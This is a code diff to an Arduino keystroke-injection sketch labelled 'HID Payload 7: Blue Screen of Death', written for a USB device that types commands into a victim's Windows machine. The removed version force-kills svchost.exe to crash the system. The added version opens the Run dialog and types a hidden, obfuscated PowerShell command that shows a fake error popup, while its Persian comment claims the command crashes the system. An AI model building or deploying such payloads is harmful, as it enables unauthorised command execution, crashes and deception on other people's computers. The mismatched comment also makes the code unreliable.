@@ -1,15 +1,15 @@
-// HID Payload 7: Blue Screen of Death (BSOD)
-#include "Arduino.h"
-#include "USB.h"
-#include "USBHIDKeyboard.h"
-
+#include <USBHIDKeyboard.h>
 USBHIDKeyboard Keyboard;
 
 void setup() {
-    USB.begin();
-    Keyboard.begin();
-    delay(2000);
-    Keyboard.println("taskkill /IM svchost.exe /F");
+  Keyboard.begin();
+  delay(3000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  // استفاده از دستور Native PowerShell برای Crash سیستم
+  Keyboard.println("powershell -w hidden { & (\"{0}{1}\"-f 'C','md') (New-Object -ComObject WScript.Shell).Popup('BSOD Fake!',0,'Error',16) }");
 }
 
 void loop() {}
